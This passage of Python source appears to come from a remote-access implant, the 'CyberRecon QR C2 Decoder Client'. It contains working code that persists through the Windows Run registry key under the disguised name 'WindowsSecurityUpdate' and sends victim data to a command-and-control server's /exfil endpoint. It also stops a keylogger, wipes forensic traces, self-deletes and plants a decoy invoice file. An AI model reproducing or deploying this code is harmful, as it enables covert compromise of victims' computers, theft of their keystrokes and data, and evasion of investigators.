            self._exfil("shell", f"[ERROR] {type(e).__name__}: {e}")

    def _handle_persist(self, cmd):
        try:
            import winreg
            exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0,
                              winreg.REG_SZ, exe)
            winreg.CloseKey(key)
            print("    -> Persistence established (HKCU Run)")
            self._exfil("persist", "HKCU\\Run\\WindowsSecurityUpdate set")
        except Exception as e:
            print(f"    -> [!] Persistence failed: {type(e).__name__}")
            self._exfil("persist", f"[ERROR] {e}")

    def _handle_self_destruct(self, cmd):
        print("    -> [!] SELF-DESTRUCT INITIATED")

        # 1. Stop background modules
        try:
            self.keylogger.stop()
        except Exception:
            pass

        # 2. Shut down headless Chrome
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass

        # 3. Notify server to purge its victims_state.json entry
        try:
            self.session.post(
                f"{self.c2_url}/self_destruct_notify/{self.victim_id}",
                json={"reason": "operator-requested"},
                timeout=3,
            )
        except Exception:
            pass

        # 4. Deep anti-forensics sweep
        try:
            decoy_path = os.path.join(
                os.path.expanduser("~"), "Documents", "Invoice_2026_10.pdf"
            )
            remove_decoy = os.getenv("CYBERRECON_REMOVE_DECOY", "0") == "1"
            SelfDestructor(
                sandbox_dir=SANDBOX_DIR,
                decoy_path=decoy_path,
                remove_decoy=remove_decoy,
            ).run()
        except Exception as e:
            print(f"    -> [!] Anti-forensics sweep failed: {type(e).__name__}")

        # 5. Exit — detached cmd.exe finishes the file deletion 3s from now
        os._exit(0)

    def _handle_unknown(self, cmd):
        print(f"    -> [!] Unknown command: {cmd}")

    def _exfil(self, data_type, data):
        try:
            self.session.post(
                f"{self.c2_url}/exfil/{self.victim_id}",
                json={"type": data_type, "data": data},
                timeout=5,
            )
        except Exception as e:
            print(f"    -> [!] Exfil failed: {type(e).__name__}")

    def cleanup(self):
        try:
            self.keylogger.stop()
        except Exception:
            pass
        try:
            if self.driver:
                self.driver.quit()
        except Exception:
            pass
        self.driver = None


# ============================================================
# Main
# ============================================================
def main():
    import argparse
    parser = argparse.ArgumentParser(description="CyberRecon QR C2 Decoder Client")
    parser.add_argument("--c2",
                        default=os.getenv("CYBERRECON_C2", "https://127.0.0.1:8443"),
                        help="C2 server URL (or CYBERRECON_C2 env var)")
    parser.add_argument("--victim-id", help="Victim session ID")
    parser.add_argument("--hostname", default=None, help="Hostname")
    parser.add_argument("--auto-register", action="store_true", help="Auto-register")
    parser.add_argument("--interval", type=int,
                        default=int(os.getenv("CYBERRECON_INTERVAL", "3")),
                        help="QR poll interval (s)")

    # If launched as .exe with no args → auto-register and go.
    if getattr(sys, "frozen", False) and len(sys.argv) == 1:
        args = parser.parse_args(["--auto-register"])
    else:
        args = parser.parse_args()

    if not VICTIM_KEY:
        print("[!] WARNING: CYBERRECON_VICTIM_KEY not set. Server may reject you.")
    if _aesgcm is None and C2_KEY:
        print("[!] WARNING: AES key present but failed to load.")
    if _aesgcm is None and not C2_KEY:
        print("[!] WARNING: AES disabled — QR payloads are plaintext.")

    # Fire-and-forget: self-delete + decoy (only runs in .exe builds, only once)
    try:
        self_delete_and_plant_decoy()
    except Exception:
        pass

    decoder = QRDecoder(args.c2, args.victim_id or "pending")

    if args.auto_register or not args.victim_id:
        print("[*] Auto-registering with C2...")
        decoder.register_with_c2(hostname=args.hostname)

    decoder.init_headless_browser()

    try:
        decoder.listen_for_commands(interval=args.interval)
    except KeyboardInterrupt:
        print("\n[!] Shutdown requested")
    finally:
        try:
            decoder.cleanup()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] Fatal: {type(e).__name__}: {e}")